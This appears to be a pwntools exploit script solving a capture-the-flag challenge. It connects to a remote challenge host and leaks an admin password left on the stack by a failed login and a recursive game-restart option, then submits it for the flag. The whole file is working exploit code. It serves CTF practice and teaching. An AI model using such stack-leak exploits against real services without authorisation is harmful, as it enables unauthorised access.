#!/usr/bin/python3

from pwn import *
elf = context.binary = ELF('./static/chall')
libc = elf.libc

local = False

if local:
    p = elf.process()
else:
    host = 'pwn-last-nlb-0d63277296ffae91.elb.us-east-1.amazonaws.com'
    port = 7293
    p = remote(host,port)

if args.GDB:
    gdb.attach(p,gdbscript=f'''
        continue
    ''')

# Send random password, this is not supposed to pass, but it does leave the actual password
# saved on the stack which will be important for the rest of the exploit
p.sendline(b'2')
p.sendline(b"BBBBBBBB")

# Start the game
p.sendline(b'1')
p.sendline(b'x')

# Restart the game. Since the restart option is recursive, the stack grows larger by using it. 
# This causes the admin password that was previously put on the stack to overlap with the current
# stack frame. Also use an option that is not 'y' or 'n' so that the math problems are not 
# initialized this overwriting the password
for i in range(1):
    p.sendline(b'3')
    p.sendline(b'x')

# We can now write out the answers and parse them to retrieve the password
p.sendline(b'2')
p.recvuntil('2. ')
password = p.recvline()[:-1]

# Access the configs, providing the password to get the flag
p.clean()
p.sendline()
p.sendline(b'2')
p.sendline(password)

p.interactive()
